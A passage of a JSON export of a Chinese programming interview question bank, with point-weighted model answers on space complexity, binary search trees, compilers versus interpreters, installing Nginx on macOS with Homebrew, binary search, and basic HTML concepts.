常数空间复杂度：算法执行过程中所需的额外空间是固定的，不随输入规模变化。例如，计算两个整数之和的函数，除了输入参数和返回值，没有使用额外的与输入规模相关的空间。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 常数空间复杂度：算法执行过程中所需的额外空间是固定的，不随输入规模变化。例如，计算两个整数之和的函数，除了输入参数和返回值，没有使用额外的与输入规模相关的空间。","text":" 常数空间复杂度：算法执行过程中所需的额外空间是固定的，不随输入规模变化。例如，计算两个整数之和的函数，除了输入参数和返回值，没有使用额外的与输入规模相关的空间。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```python\\ndef add_numbers(a, b):\\n    return a + b\\n```","lang":"python","text":"def add_numbers(a, b):\\n    return a + b"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** 线性空间复杂度：算法执行过程中所需的额外空间与输入规模成正比。例如，创建一个长度为 n 的数组来存储数据，其空间复杂度为 O (n)。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 线性空间复杂度：算法执行过程中所需的额外空间与输入规模成正比。例如，创建一个长度为 n 的数组来存储数据，其空间复杂度为 O (n)。","task":false,"loose":false,"text":"**1：** 线性空间复杂度：算法执行过程中所需的额外空间与输入规模成正比。例如，创建一个长度为 n 的数组来存储数据，其空间复杂度为 O (n)。","tokens":[{"type":"text","raw":"**1：** 线性空间复杂度：算法执行过程中所需的额外空间与输入规模成正比。例如，创建一个长度为 n 的数组来存储数据，其空间复杂度为 O (n)。","text":"**1：** 线性空间复杂度：算法执行过程中所需的额外空间与输入规模成正比。例如，创建一个长度为 n 的数组来存储数据，其空间复杂度为 O (n)。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 线性空间复杂度：算法执行过程中所需的额外空间与输入规模成正比。例如，创建一个长度为 n 的数组来存储数据，其空间复杂度为 O (n)。","text":" 线性空间复杂度：算法执行过程中所需的额外空间与输入规模成正比。例如，创建一个长度为 n 的数组来存储数据，其空间复杂度为 O (n)。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```python\\ndef create_array(n):\\n    return [0] * n\\n```","lang":"python","text":"def create_array(n):\\n    return [0] * n"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** 平方空间复杂度：常见于创建二维数组等情况，例如创建一个 n×n 的二维数组，其空间复杂度为 O (n²)。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 平方空间复杂度：常见于创建二维数组等情况，例如创建一个 n×n 的二维数组，其空间复杂度为 O (n²)。","task":false,"loose":false,"text":"**1：** 平方空间复杂度：常见于创建二维数组等情况，例如创建一个 n×n 的二维数组，其空间复杂度为 O (n²)。","tokens":[{"type":"text","raw":"**1：** 平方空间复杂度：常见于创建二维数组等情况，例如创建一个 n×n 的二维数组，其空间复杂度为 O (n²)。","text":"**1：** 平方空间复杂度：常见于创建二维数组等情况，例如创建一个 n×n 的二维数组，其空间复杂度为 O (n²)。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 平方空间复杂度：常见于创建二维数组等情况，例如创建一个 n×n 的二维数组，其空间复杂度为 O (n²)。","text":" 平方空间复杂度：常见于创建二维数组等情况，例如创建一个 n×n 的二维数组，其空间复杂度为 O (n²)。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```python\\ndef create_2d_array(n):\\n    return [[0] * n for _ in range(n)]\\n```","lang":"python","text":"def create_2d_array(n):\\n    return [[0] * n for _ in range(n)]"},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## 什么是二叉搜索树（BST）\\n\\n","depth":2,"text":"什么是二叉搜索树（BST）","tokens":[{"type":"text","raw":"什么是二叉搜索树（BST）","text":"什么是二叉搜索树（BST）","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：** 二叉搜索树是一种二叉树，对于树中的每个节点，其左子树的所有节点值都小于该节点值，右子树的所有节点值都大于该节点值。这种特性使得在二叉搜索树上进行查\\n找、插入和删除操作的平均时间复杂度为 O (log n)，n 为节点数。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 二叉搜索树是一种二叉树，对于树中的每个节点，其左子树的所有节点值都小于该节点值，右子树的所有节点值都大于该节点值。这种特性使得在二叉搜索树上进行查\\n找、插入和删除操作的平均时间复杂度为 O (log n)，n 为节点数。","task":false,"loose":false,"text":"**1：** 二叉搜索树是一种二叉树，对于树中的每个节点，其左子树的所有节点值都小于该节点值，右子树的所有节点值都大于该节点值。这种特性使得在二叉搜索树上进行查\\n找、插入和删除操作的平均时间复杂度为 O (log n)，n 为节点数。","tokens":[{"type":"text","raw":"**1：** 二叉搜索树是一种二叉树，对于树中的每个节点，其左子树的所有节点值都小于该节点值，右子树的所有节点值都大于该节点值。这种特性使得在二叉搜索树上进行查\\n\\n找、插入和删除操作的平均时间复杂度为 O (log n)，n 为节点数。","text":"**1：** 二叉搜索树是一种二叉树，对于树中的每个节点，其左子树的所有节点值都小于该节点值，右子树的所有节点值都大于该节点值。这种特性使得在二叉搜索树上进行查\\n找、插入和删除操作的平均时间复杂度为 O (log n)，n 为节点数。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 二叉搜索树是一种二叉树，对于树中的每个节点，其左子树的所有节点值都小于该节点值，右子树的所有节点值都大于该节点值。这种特性使得在二叉搜索树上进行查\\n找、插入和删除操作的平均时间复杂度为 O (log n)，n 为节点数。","text":" 二叉搜索树是一种二叉树，对于树中的每个节点，其左子树的所有节点值都小于该节点值，右子树的所有节点值都大于该节点值。这种特性使得在二叉搜索树上进行查\\n找、插入和删除操作的平均时间复杂度为 O (log n)，n 为节点数。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 简述编译器和解释器的区别\\n\\n","depth":2,"text":"简述编译器和解释器的区别","tokens":[{"type":"text","raw":"简述编译器和解释器的区别","text":"简述编译器和解释器的区别","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：** 编译器会将源程序一次性全部翻译成目标机器可执行的机器语言，如 C、C++ 等语言通过编译器编译后生成可执行文件。解释器则是逐行读取源程序，边解释边执行，并不生成\\n目标程序，如 Python 语言默认通过解释器运行代码。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 编译器会将源程序一次性全部翻译成目标机器可执行的机器语言，如 C、C++ 等语言通过编译器编译后生成可执行文件。解释器则是逐行读取源程序，边解释边执行，并不生成\\n目标程序，如 Python 语言默认通过解释器运行代码。","task":false,"loose":false,"text":"**1：** 编译器会将源程序一次性全部翻译成目标机器可执行的机器语言，如 C、C++ 等语言通过编译器编译后生成可执行文件。解释器则是逐行读取源程序，边解释边执行，并不生成\\n目标程序，如 Python 语言默认通过解释器运行代码。","tokens":[{"type":"text","raw":"**1：** 编译器会将源程序一次性全部翻译成目标机器可执行的机器语言，如 C、C++ 等语言通过编译器编译后生成可执行文件。解释器则是逐行读取源程序，边解释边执行，并不生成\\n\\n目标程序，如 Python 语言默认通过解释器运行代码。","text":"**1：** 编译器会将源程序一次性全部翻译成目标机器可执行的机器语言，如 C、C++ 等语言通过编译器编译后生成可执行文件。解释器则是逐行读取源程序，边解释边执行，并不生成\\n目标程序，如 Python 语言默认通过解释器运行代码。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 编译器会将源程序一次性全部翻译成目标机器可执行的机器语言，如 C、C++ 等语言通过编译器编译后生成可执行文件。解释器则是逐行读取源程序，边解释边执行，并不生成\\n目标程序，如 Python 语言默认通过解释器运行代码。","text":" 编译器会将源程序一次性全部翻译成目标机器可执行的机器语言，如 C、C++ 等语言通过编译器编译后生成可执行文件。解释器则是逐行读取源程序，边解释边执行，并不生成\\n目标程序，如 Python 语言默认通过解释器运行代码。","escaped":false}]}]}]}]},{"key":"计算机系统","content":"<h1>计算机系统 Mac</h1>\\n<h2>Mac 安装 Nginx</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<details>\\n\\n<pre><code class=\\"language-shell\\"># 基于 brew 安装 Nginx\\n\\n# 安装 Nginx\\nbrew install nginx\\n</code></pre>\\n<p><img src=\\"/public/images/4_Nginx_20241231111116.png\\" alt=\\"\\"></p>\\n<p><a href=\\"https://juejin.cn/post/6883018403641032712\\">常用指令</a></p>\\n<pre><code class=\\"language-shell\\">\\n# 查看配置信息\\nbrew info nginx\\n\\n# 查看 Nginx 配置文件内容\\ncat /opt/homebrew/etc/nginx/nginx.conf\\n\\n# 查看 Nginx 进程\\nps -ef | grep nginx\\n\\n# 查看 Nginx 进程数\\nps -ef | grep nginx | wc -l\\n\\n# 查看 Nginx 进程 ID\\nps -ef | grep nginx | awk &#39;{print $2}&#39;\\n\\n# 查看 Nginx 进程 ID 的个数\\nps -ef | grep nginx | awk &#39;{print $2}&#39; | wc -l\\n</code></pre>\\n<p><img src=\\"/public/images/4_Nginx_20241231113535.png\\" alt=\\"\\"></p>\\n<pre><code class=\\"language-shell\\"># 启动 Nginx\\nbrew services start nginx\\n\\n# 打开界面时，记得查看端口是否被占用\\n# 重启 Nginx\\nbrew services restart nginx\\n\\n# 停止 Nginx\\nbrew services stop nginx\\n\\n# 取消进程\\nsudo kill 进程 ID\\n</code></pre>\\n</details>","ast":[{"type":"heading","raw":"# 计算机系统 Mac\\n\\n","depth":1,"text":"计算机系统 Mac","tokens":[{"type":"text","raw":"计算机系统 Mac","text":"计算机系统 Mac","escaped":false}]},{"type":"heading","raw":"## Mac 安装 Nginx\\n\\n","depth":2,"text":"Mac 安装 Nginx","tokens":[{"type":"text","raw":"Mac 安装 Nginx","text":"Mac 安装 Nginx","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"code","raw":"```shell\\n# 基于 brew 安装 Nginx\\n\\n# 安装 Nginx\\nbrew install nginx\\n```","lang":"shell","text":"# 基于 brew 安装 Nginx\\n\\n# 安装 Nginx\\nbrew install nginx"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"![](/public/images/4_Nginx_20241231111116.png)","text":"![](/public/images/4_Nginx_20241231111116.png)","tokens":[{"type":"image","raw":"![](/public/images/4_Nginx_20241231111116.png)","href":"/public/images/4_Nginx_20241231111116.png","title":null,"text":""}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"[常用指令](https://juejin.cn/post/6883018403641032712)","text":"[常用指令](https://juejin.cn/post/6883018403641032712)","tokens":[{"type":"link","raw":"[常用指令](https://juejin.cn/post/6883018403641032712)","href":"https://juejin.cn/post/6883018403641032712","title":null,"text":"常用指令","tokens":[{"type":"text","raw":"常用指令","text":"常用指令","escaped":false}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```shell\\n\\n# 查看配置信息\\nbrew info nginx\\n\\n# 查看 Nginx 配置文件内容\\ncat /opt/homebrew/etc/nginx/nginx.conf\\n\\n# 查看 Nginx 进程\\nps -ef | grep nginx\\n\\n# 查看 Nginx 进程数\\nps -ef | grep nginx | wc -l\\n\\n# 查看 Nginx 进程 ID\\nps -ef | grep nginx | awk \'{print $2}\'\\n\\n# 查看 Nginx 进程 ID 的个数\\nps -ef | grep nginx | awk \'{print $2}\' | wc -l\\n\\n```","lang":"shell","text":"\\n# 查看配置信息\\nbrew info nginx\\n\\n# 查看 Nginx 配置文件内容\\ncat /opt/homebrew/etc/nginx/nginx.conf\\n\\n# 查看 Nginx 进程\\nps -ef | grep nginx\\n\\n# 查看 Nginx 进程数\\nps -ef | grep nginx | wc -l\\n\\n# 查看 Nginx 进程 ID\\nps -ef | grep nginx | awk \'{print $2}\'\\n\\n# 查看 Nginx 进程 ID 的个数\\nps -ef | grep nginx | awk \'{print $2}\' | wc -l\\n"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"![](/public/images/4_Nginx_20241231113535.png)","text":"![](/public/images/4_Nginx_20241231113535.png)","tokens":[{"type":"image","raw":"![](/public/images/4_Nginx_20241231113535.png)","href":"/public/images/4_Nginx_20241231113535.png","title":null,"text":""}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```shell\\n# 启动 Nginx\\nbrew services start nginx\\n\\n# 打开界面时，记得查看端口是否被占用\\n# 重启 Nginx\\nbrew services restart nginx\\n\\n# 停止 Nginx\\nbrew services stop nginx\\n\\n# 取消进程\\nsudo kill 进程 ID\\n```","lang":"shell","text":"# 启动 Nginx\\nbrew services start nginx\\n\\n# 打开界面时，记得查看端口是否被占用\\n# 重启 Nginx\\nbrew services restart nginx\\n\\n# 停止 Nginx\\nbrew services stop nginx\\n\\n# 取消进程\\nsudo kill 进程 ID"},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>","pre":false,"text":"</details>"}]},{"key":"算法","content":"<h1>算法</h1>\\n<h2>二分查找</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 适用条件： 数组必须是有序的。</li>\\n<li><strong>1：</strong> 应用场景： 查找有序数组中的元素，例如数据查询、搜索问题。</li>\\n<li><strong>1：</strong> 时间复杂度： O(log n)。</li>\\n<li><strong>1：</strong> 思路：<ul>\\n<li>每次取中间元素与目标值比较。</li>\\n<li>若中间值大于目标值，目标值一定在左半部分。</li>\\n<li>若中间值小于目标值，目标值一定在右半部分。</li>\\n<li>重复上述步骤直到找到目标值或数组为空。</li>\\n</ul>\\n</li>\\n</ul>\\n<pre><code class=\\"language-javascript\\">function binarySearch(arr, target) {\\n  let left = 0, right = arr.length - 1;\\n  while (left &lt;= right) {\\n    const mid = Math.floor((left + right) / 2);\\n    if (arr[mid] === target) {\\n        return mid;\\n    } else if (arr[mid] &lt; target) {\\n        left = mid + 1;\\n    } else {\\n        right = mid - 1;\\n    }\\n  }\\n  return -1; // 未找到目标值\\n}\\n</code></pre>\\n","ast":[{"type":"heading","raw":"# 算法\\n\\n","depth":1,"text":"算法","tokens":[{"type":"text","raw":"算法","text":"算法","escaped":false}]},{"type":"heading","raw":"## 二分查找\\n\\n","depth":2,"text":"二分查找","tokens":[{"type":"text","raw":"二分查找","text":"二分查找","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"list","raw":"- **1：** 适用条件： 数组必须是有序的。\\n- **1：** 应用场景： 查找有序数组中的元素，例如数据查询、搜索问题。\\n- **1：** 时间复杂度： O(log n)。\\n- **1：** 思路：\\n  + 每次取中间元素与目标值比较。\\n  + 若中间值大于目标值，目标值一定在左半部分。\\n  + 若中间值小于目标值，目标值一定在右半部分。\\n  + 重复上述步骤直到找到目标值或数组为空。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 适用条件： 数组必须是有序的。\\n","task":false,"loose":false,"text":"**1：** 适用条件： 数组必须是有序的。","tokens":[{"type":"text","raw":"**1：** 适用条件： 数组必须是有序的。","text":"**1：** 适用条件： 数组必须是有序的。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 适用条件： 数组必须是有序的。","text":" 适用条件： 数组必须是有序的。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 应用场景： 查找有序数组中的元素，例如数据查询、搜索问题。\\n","task":false,"loose":false,"text":"**1：** 应用场景： 查找有序数组中的元素，例如数据查询、搜索问题。","tokens":[{"type":"text","raw":"**1：** 应用场景： 查找有序数组中的元素，例如数据查询、搜索问题。","text":"**1：** 应用场景： 查找有序数组中的元素，例如数据查询、搜索问题。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 应用场景： 查找有序数组中的元素，例如数据查询、搜索问题。","text":" 应用场景： 查找有序数组中的元素，例如数据查询、搜索问题。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 时间复杂度： O(log n)。\\n","task":false,"loose":false,"text":"**1：** 时间复杂度： O(log n)。","tokens":[{"type":"text","raw":"**1：** 时间复杂度： O(log n)。","text":"**1：** 时间复杂度： O(log n)。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 时间复杂度： O(log n)。","text":" 时间复杂度： O(log n)。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 思路：\\n  + 每次取中间元素与目标值比较。\\n  + 若中间值大于目标值，目标值一定在左半部分。\\n  + 若中间值小于目标值，目标值一定在右半部分。\\n  + 重复上述步骤直到找到目标值或数组为空。","task":false,"loose":false,"text":"**1：** 思路：\\n+ 每次取中间元素与目标值比较。\\n+ 若中间值大于目标值，目标值一定在左半部分。\\n+ 若中间值小于目标值，目标值一定在右半部分。\\n+ 重复上述步骤直到找到目标值或数组为空。","tokens":[{"type":"text","raw":"**1：** 思路：\\n","text":"**1：** 思路：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 思路：","text":" 思路：","escaped":false}]},{"type":"list","raw":"+ 每次取中间元素与目标值比较。\\n+ 若中间值大于目标值，目标值一定在左半部分。\\n+ 若中间值小于目标值，目标值一定在右半部分。\\n+ 重复上述步骤直到找到目标值或数组为空。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 每次取中间元素与目标值比较。\\n","task":false,"loose":false,"text":"每次取中间元素与目标值比较。","tokens":[{"type":"text","raw":"每次取中间元素与目标值比较。","text":"每次取中间元素与目标值比较。","tokens":[{"type":"text","raw":"每次取中间元素与目标值比较。","text":"每次取中间元素与目标值比较。","escaped":false}]}]},{"type":"list_item","raw":"+ 若中间值大于目标值，目标值一定在左半部分。\\n","task":false,"loose":false,"text":"若中间值大于目标值，目标值一定在左半部分。","tokens":[{"type":"text","raw":"若中间值大于目标值，目标值一定在左半部分。","text":"若中间值大于目标值，目标值一定在左半部分。","tokens":[{"type":"text","raw":"若中间值大于目标值，目标值一定在左半部分。","text":"若中间值大于目标值，目标值一定在左半部分。","escaped":false}]}]},{"type":"list_item","raw":"+ 若中间值小于目标值，目标值一定在右半部分。\\n","task":false,"loose":false,"text":"若中间值小于目标值，目标值一定在右半部分。","tokens":[{"type":"text","raw":"若中间值小于目标值，目标值一定在右半部分。","text":"若中间值小于目标值，目标值一定在右半部分。","tokens":[{"type":"text","raw":"若中间值小于目标值，目标值一定在右半部分。","text":"若中间值小于目标值，目标值一定在右半部分。","escaped":false}]}]},{"type":"list_item","raw":"+ 重复上述步骤直到找到目标值或数组为空。","task":false,"loose":false,"text":"重复上述步骤直到找到目标值或数组为空。","tokens":[{"type":"text","raw":"重复上述步骤直到找到目标值或数组为空。","text":"重复上述步骤直到找到目标值或数组为空。","tokens":[{"type":"text","raw":"重复上述步骤直到找到目标值或数组为空。","text":"重复上述步骤直到找到目标值或数组为空。","escaped":false}]}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```javascript\\nfunction binarySearch(arr, target) {\\n  let left = 0, right = arr.length - 1;\\n  while (left <= right) {\\n    const mid = Math.floor((left + right) / 2);\\n    if (arr[mid] === target) {\\n        return mid;\\n    } else if (arr[mid] < target) {\\n        left = mid + 1;\\n    } else {\\n        right = mid - 1;\\n    }\\n  }\\n  return -1; // 未找到目标值\\n}\\n\\n```\\n","lang":"javascript","text":"function binarySearch(arr, target) {\\n  let left = 0, right = arr.length - 1;\\n  while (left <= right) {\\n    const mid = Math.floor((left + right) / 2);\\n    if (arr[mid] === target) {\\n        return mid;\\n    } else if (arr[mid] < target) {\\n        left = mid + 1;\\n    } else {\\n        right = mid - 1;\\n    }\\n  }\\n  return -1; // 未找到目标值\\n}\\n"}]},{"key":"HTML","content":"<h1>HTML</h1>\\n<h2>1. 什么是静态网页？什么是动态网页？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>2：</strong> 静态网页：没有与服务端发生交互的网页；动态网页：与服务端有交互的网页</li>\\n</ul>\\n<h2>2. 谈谈你对 HTML 语义化的理解</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><strong>1：</strong> What：通过语义化标签对网站进行结构化；</li>\\n<li><strong>1：</strong> Why：便于浏览器解析，便于特殊设备解析，便于搜索引擎收录，提高代码的可维护性和复用性；</li>\\n<li><strong>1：</strong> How：<code>header</code>-文档头、<code>nav</code>-导航区、<code>section</code>-文档块、<code>article</code>-内容、<code>aside</code>-侧边栏-广告栏、<code>footer</code>-文档脚注；</li>\\n</ul>\\n<h2>3. 谈谈你对锚点的理解</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>1：</strong> What &amp; Why：文档中某一行的记号，用于链接到文档中指定的位置；避免用户频繁滚动页面，提升用户体验；</li>\\n<li><strong>1：</strong> How：<code>&lt;h2 id=&quot;know&quot;&gt;谈谈你对锚点的理解 &lt;a href=&quot;#know&quot;&gt;​&lt;/a&gt;&lt;/h2&gt;</code>、<code>&lt;div&gt;&lt;a name=&quot;know&quot;&gt;​&lt;/a&gt;&lt;a href=&quot;#know&quot;&gt;​&lt;/a&gt;&lt;/div&gt;</code>、``；</li>\\n</ul>\\n<h2>4. 超链接有哪些常见的表现形式？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>2：</strong><ul>\\n<li>跳转链接：页面跳转，<code>&lt;a href=&quot;http://www.baidu.com&quot;&gt;百度&lt;/a&gt;</code></li>\\n<li>下载链接：下载资源，<code>&lt;a href=&quot;data.zip&quot;&gt;本地&lt;/a&gt;</code></li>\\n<li>锚点链接：锚点跳转，<code>&lt;a href=&quot;#know&quot;&gt;​&lt;/a&gt;</code></li>\\n<li>邮箱链接：唤起邮箱，<code>&lt;a href=&quot;mailto:xxx@xxx.com&quot;&gt;xxx&lt;/a&gt;</code></li>\\n<li>空链接：返回页面顶部，<code>&lt;a href=&quot;&quot;&gt;​&lt;/a&gt;</code></li>\\n<li>代码块：执行代码，<code>&lt;a href=&quot;javascript:void(0);&quot;&gt;​&lt;/a&gt;</code></li>\\n</ul>\\n</li>\\n</ul>\\n<h2>5. img 标签的 title 和 alt 属性作用</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong> <code>title</code>属性是当鼠标悬停在图片上时，显示的提示文本；<code>alt</code>属性是图片无法正常显示时，显示的文本，如：图片加载失败、图片被屏蔽等。</li>\\n</ul>\\n<h2>6. src 与 href 的区别</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong> <code>src</code>属性是资源路径，引入资源，属于当前页不可缺少的部分，如：<code>src=&quot;http://www.baidu.com/logo.png&quot;</code>；<code>href</code>属性是超链接，引用资源，表示该资源与当前页有关联，如：<code>href=&quot;http://www.baidu.com&quot;</code>。</li>\\n</ul>\\n<h2>7. iframe 有哪些特点（优缺点）？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<ul>\\n<li><strong>2：</strong> 优点：<ul>\\n<li>内容独立：iframe 